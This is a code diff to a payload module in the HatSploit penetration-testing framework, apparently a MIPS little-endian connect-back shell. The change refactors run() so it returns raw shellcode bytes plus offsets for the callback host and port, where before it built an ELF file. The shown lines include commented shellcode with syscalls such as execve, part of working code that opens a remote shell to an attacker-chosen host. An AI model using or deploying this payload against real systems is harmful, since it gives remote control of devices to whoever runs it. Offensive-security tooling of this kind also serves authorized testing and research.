@@ -6,6 +6,7 @@
 #
 
 from hatvenom import HatVenom
+
 from hatsploit.lib.payload import Payload
 from hatsploit.utils.tcp import TCPClient
 
@@ -46,13 +47,7 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        offsets = {
-            'cbport': connback_port,
-            'cbhost1': self.ip_bytes(connback_host)[2:],
-            'cbhost2': self.ip_bytes(connback_host)[:2]
-        }
-
-        shellcode = (
+        return (
             b"\xff\xff\x04\x28"  # slti    a0,zero,-1
             b"\xa6\x0f\x02\x24"  # li      v0,4006
             b"\x0c\x09\x09\x01"  # syscall 0x42424
@@ -102,7 +97,8 @@ class HatSploitPayload(Payload, HatVenom):
             b"\xff\xff\x06\x28"  # slti    a2,zero,-1
             b"\xab\x0f\x02\x24"  # li      v0,4011
             b"\x0c\x09\x09\x01"  # syscall 0x42424
-        )
-
-        payload = self.generate('elf', 'mipsle', shellcode, offsets)
-        return payload
+        ), {
+            'cbport': connback_port,
+            'cbhost1': self.ip_bytes(connback_host)[2:],
+            'cbhost2': self.ip_bytes(connback_host)[:2]
+        }
